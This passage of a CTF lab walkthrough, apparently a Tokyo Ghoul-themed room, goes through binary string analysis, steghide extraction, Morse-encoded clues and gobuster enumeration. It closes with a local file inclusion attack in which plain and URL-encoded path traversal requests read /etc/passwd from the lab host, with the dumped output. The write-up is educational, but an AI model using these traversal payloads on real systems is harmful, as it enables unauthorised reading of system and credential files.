+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Good job. I believe this is what you came for:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Hmm. I don&#39;</span>t think this is what I was looking <span style="color:#66d9ef">for</span>.
+</span></span><span style="display:flex;"><span>Take a look inside of me. rabin2 -z
+</span></span><span style="display:flex;"><span>;*3$<span style="color:#e6db74">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">GCC: (Debian 9.3.0-15) 9.3.0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">crtstuff.c
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">deregister_tm_clones
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">__do_global_dtors_aux
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">completed.7452
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">__do_global_dtors_aux_fini_array_entry
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">frame_dummy
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">__frame_dummy_init_array_entry
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">need_to_talk.c
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">__FRAME_END__
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">__init_array_end
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">_DYNAMIC
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">__init_array_start
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">__GNU_EH_FRAME_HDR
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">_GLOBAL_OFFSET_TABLE_
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">__libc_csu_fini
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">free@@GLIBC_2.2.5
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">putchar@@GLIBC_2.2.5
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">print_intro
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">_ITM_deregisterTMCloneTable
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">stdout@@GLIBC_2.2.5
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">sleep_delay
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">puts@@GLIBC_2.2.5
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">stdin@@GLIBC_2.2.5
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">_edata
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">strlen@@GLIBC_2.2.5
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">setbuf@@GLIBC_2.2.5
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">printf@@GLIBC_2.2.5
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">slow_type
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">__libc_start_main@@GLIBC_2.2.5
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">fgets@@GLIBC_2.2.5
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">__data_start
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">strcmp@@GLIBC_2.2.5
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">__gmon_start__
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">__dso_handle
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">_IO_stdin_used
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">__libc_csu_init
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">malloc@@GLIBC_2.2.5
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">__bss_start
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">main
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">dialogs
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">check_password
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">print_flag
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">__TMC_END__
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">_ITM_registerTMCloneTable
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">__cxa_finalize@@GLIBC_2.2.5
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">the_password
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">usleep@@GLIBC_2.2.5
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">.symtab
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">.strtab
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">.shstrtab
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">.interp
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">.note.gnu.build-id
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">.note.ABI-tag
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">.gnu.hash
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">.dynsym
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">.dynstr
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">.gnu.version
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">.gnu.version_r
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">.rela.dyn
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">.rela.plt
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">.init
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">.plt.got
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">.text
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">.fini
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">.rodata
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">.eh_frame_hdr
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">.eh_frame
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">.init_array
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">.fini_array
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">.dynamic
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">.got.plt
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">.data
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">.bss
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">.comment
+</span></span></span></code></pre></div><p>I execute another time the <code>elf</code> file with the passphrase:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ./need_to_talk
+</span></span><span style="display:flex;"><span>Hey Kaneki finnaly you want to talk 
+</span></span><span style="display:flex;"><span>Unfortunately before I can give you the kagune you need to give me the paraphrase
+</span></span><span style="display:flex;"><span>Do you have what I<span style="color:#960050;background-color:#1e0010">&#39;</span>m looking <span style="color:#66d9ef">for</span>?
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&gt; kamishiro
+</span></span><span style="display:flex;"><span>Good job. I believe this is what you came <span style="color:#66d9ef">for</span>:
+</span></span><span style="display:flex;"><span>You_found_1t
+</span></span></code></pre></div><p>What is the key for Rize executable? <code>kamishiro</code>
+I discover even <code>You_found_1t</code> a possible passphrase to the steganography</p>
+<h2 id="steganography">Steganography<a href="#steganography" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I use this passphrase to extract all data of the image : <code>You_found_1t</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ steghide info rize_and_kaneki.jpg  
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;rize_and_kaneki.jpg&#34;</span>:
+</span></span><span style="display:flex;"><span>  format: jpeg
+</span></span><span style="display:flex;"><span>  capacity: 2.7 KB
+</span></span><span style="display:flex;"><span>Try to get information about embedded data ? <span style="color:#f92672">(</span>y/n<span style="color:#f92672">)</span> y
+</span></span><span style="display:flex;"><span>Enter passphrase: 
+</span></span><span style="display:flex;"><span>  embedded file <span style="color:#e6db74">&#34;yougotme.txt&#34;</span>:
+</span></span><span style="display:flex;"><span>    size: 377.0 Byte
+</span></span><span style="display:flex;"><span>    encrypted: rijndael-128, cbc
+</span></span><span style="display:flex;"><span>    compressed: yes
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ steghide extract -sf rize_and_kaneki.jpg 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Enter passphrase: 
+</span></span><span style="display:flex;"><span>wrote extracted data to <span style="color:#e6db74">&#34;yougotme.txt&#34;</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat yougotme.txt 
+</span></span><span style="display:flex;"><span>haha you are so smart kaneki but can you talk my code 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>..... .-
+</span></span><span style="display:flex;"><span>....- ....-
+</span></span><span style="display:flex;"><span>....- -....
+</span></span><span style="display:flex;"><span>--... ----.
+</span></span><span style="display:flex;"><span>....- -..
+</span></span><span style="display:flex;"><span>...-- ..---
+</span></span><span style="display:flex;"><span>....- -..
+</span></span><span style="display:flex;"><span>...-- ...--
+</span></span><span style="display:flex;"><span>....- -..
+</span></span><span style="display:flex;"><span>....- ---..
+</span></span><span style="display:flex;"><span>....- .-
+</span></span><span style="display:flex;"><span>...-- .....
+</span></span><span style="display:flex;"><span>..... ---..
+</span></span><span style="display:flex;"><span>...-- ..---
+</span></span><span style="display:flex;"><span>....- .
+</span></span><span style="display:flex;"><span>-.... -.-.
+</span></span><span style="display:flex;"><span>-.... ..---
+</span></span><span style="display:flex;"><span>-.... .
+</span></span><span style="display:flex;"><span>..... ..---
+</span></span><span style="display:flex;"><span>-.... -.-.
+</span></span><span style="display:flex;"><span>-.... ...--
+</span></span><span style="display:flex;"><span>-.... --...
+</span></span><span style="display:flex;"><span>...-- -..
+</span></span><span style="display:flex;"><span>...-- -..
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> you can talk it allright you got my secret directory 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ 
+</span></span></code></pre></div><p>I <code>decode</code> the secret directory with cyberchief(From Morse Code, From Hex, From <code>base64</code>):</p>
+<pre tabindex="0"><code>d1r3c70ry_center
+</code></pre><p>What the message mean did you understand it ? what it says? <code>d1r3c70ry_center</code></p>
+<h2 id="directory-enumeration">Directory Enumeration<a href="#directory-enumeration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I do a <code>Directory Enumeration</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ gobuster dir -u http://10.10.250.26/d1r3c70ry_center/   -w  /usr/share/wordlists/dirb/big.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Gobuster v3.4
+</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://10.10.250.26/d1r3c70ry_center/
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /usr/share/wordlists/dirb/big.txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.4
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>2023/02/14 15:50:16 Starting gobuster in directory enumeration mode
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>/.htaccess            <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 277<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/.htpasswd            <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 277<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/claim                <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 329<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.250.26/d1r3c70ry_center/claim/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Progress: <span style="color:#ae81ff">20438</span> / <span style="color:#ae81ff">20472</span> <span style="color:#f92672">(</span>99.83%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>2023/02/14 15:52:11 Finished
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span></code></pre></div><h2 id="lfi">LFI<a href="#lfi" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I find a parameter that I can injected:</p>
+<p>&ndash;&gt; Request</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /d1r3c70ry_center/claim/index.php?view=../../../../../../../../etc/passwd <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">10.10.250.26</span>
+</span></span><span style="display:flex;"><span>Cache-Control<span style="color:#f92672">:</span> <span style="color:#ae81ff">max-age=0</span>
+</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36</span>
+</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
+</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
+</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.9</span>
+</span></span><span style="display:flex;"><span>Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">PHPSESSID=no1kgens26inf2bl78uftfmrf6</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+</span></span></code></pre></div><p>&ndash;&gt; Response:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
+</span></span><span style="display:flex;"><span>Date<span style="color:#f92672">:</span> <span style="color:#ae81ff">Tue, 14 Feb 2023 21:00:56 GMT</span>
+</span></span><span style="display:flex;"><span>Server<span style="color:#f92672">:</span> <span style="color:#ae81ff">Apache/2.4.18 (Ubuntu)</span>
+</span></span><span style="display:flex;"><span>Expires<span style="color:#f92672">:</span> <span style="color:#ae81ff">Thu, 19 Nov 1981 08:52:00 GMT</span>
+</span></span><span style="display:flex;"><span>Cache-Control<span style="color:#f92672">:</span> <span style="color:#ae81ff">no-store, no-cache, must-revalidate</span>
+</span></span><span style="display:flex;"><span>Pragma<span style="color:#f92672">:</span> <span style="color:#ae81ff">no-cache</span>
+</span></span><span style="display:flex;"><span>Vary<span style="color:#f92672">:</span> <span style="color:#ae81ff">Accept-Encoding</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">378</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html; charset=UTF-8</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>	&lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://fonts.googleapis.com/css?family=IBM+Plex+Sans&#34;</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span>&gt; 
+</span></span><span style="display:flex;"><span>	&lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/css&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;style.css&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>	&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;menu&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>	    &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;index.php&#34;</span>&gt;Main Page&lt;/<span style="color:#f92672">a</span>&gt;
+</span></span><span style="display:flex;"><span>	    &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;index.php?view=flower.gif&#34;</span>&gt;NO&lt;/<span style="color:#f92672">a</span>&gt;
+</span></span><span style="display:flex;"><span>	    &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;index.php?view=flower.gif&#34;</span>&gt;YES&lt;/<span style="color:#f92672">a</span>&gt;
+</span></span><span style="display:flex;"><span>	&lt;/<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>no no no silly don&#39;t do that
+</span></span></code></pre></div><p>I use the URL decode to <code>obfuscate</code> the my payload:</p>
+<p>&ndash;&gt; Request</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /d1r3c70ry_center/claim/index.php?view=%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2Fetc%2Fpasswd <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">10.10.250.26</span>
+</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36</span>
+</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
+</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
+</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.9</span>
+</span></span><span style="display:flex;"><span>Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">PHPSESSID=no1kgens26inf2bl78uftfmrf6</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+</span></span></code></pre></div><p>&ndash;&gt; Response</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
+</span></span><span style="display:flex;"><span>Date<span style="color:#f92672">:</span> <span style="color:#ae81ff">Tue, 14 Feb 2023 21:07:30 GMT</span>
+</span></span><span style="display:flex;"><span>Server<span style="color:#f92672">:</span> <span style="color:#ae81ff">Apache/2.4.18 (Ubuntu)</span>
+</span></span><span style="display:flex;"><span>Expires<span style="color:#f92672">:</span> <span style="color:#ae81ff">Thu, 19 Nov 1981 08:52:00 GMT</span>
+</span></span><span style="display:flex;"><span>Cache-Control<span style="color:#f92672">:</span> <span style="color:#ae81ff">no-store, no-cache, must-revalidate</span>
+</span></span><span style="display:flex;"><span>Pragma<span style="color:#f92672">:</span> <span style="color:#ae81ff">no-cache</span>
+</span></span><span style="display:flex;"><span>Vary<span style="color:#f92672">:</span> <span style="color:#ae81ff">Accept-Encoding</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">2232</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html; charset=UTF-8</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>	&lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://fonts.googleapis.com/css?family=IBM+Plex+Sans&#34;</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span>&gt; 
+</span></span><span style="display:flex;"><span>	&lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/css&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;style.css&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>	&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;menu&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>	    &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;index.php&#34;</span>&gt;Main Page&lt;/<span style="color:#f92672">a</span>&gt;
+</span></span><span style="display:flex;"><span>	    &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;index.php?view=flower.gif&#34;</span>&gt;NO&lt;/<span style="color:#f92672">a</span>&gt;
+</span></span><span style="display:flex;"><span>	    &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;index.php?view=flower.gif&#34;</span>&gt;YES&lt;/<span style="color:#f92672">a</span>&gt;
+</span></span><span style="display:flex;"><span>	&lt;/<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">p</span>&gt;root:x:0:0:root:/root:/bin/bash
+</span></span><span style="display:flex;"><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>sync:x:4:65534:sync:/bin:/bin/sync
+</span></span><span style="display:flex;"><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+</span></span><span style="display:flex;"><span>systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+</span></span><span style="display:flex;"><span>systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+</span></span><span style="display:flex;"><span>systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+</span></span><span style="display:flex;"><span>syslog:x:104:108::/home/syslog:/bin/false
+</span></span><span style="display:flex;"><span>_apt:x:105:65534::/nonexistent:/bin/false
+</span></span><span style="display:flex;"><span>lxd:x:106:65534::/var/lib/lxd/:/bin/false
+</span></span><span style="display:flex;"><span>messagebus:x:107:111::/var/run/dbus:/bin/false
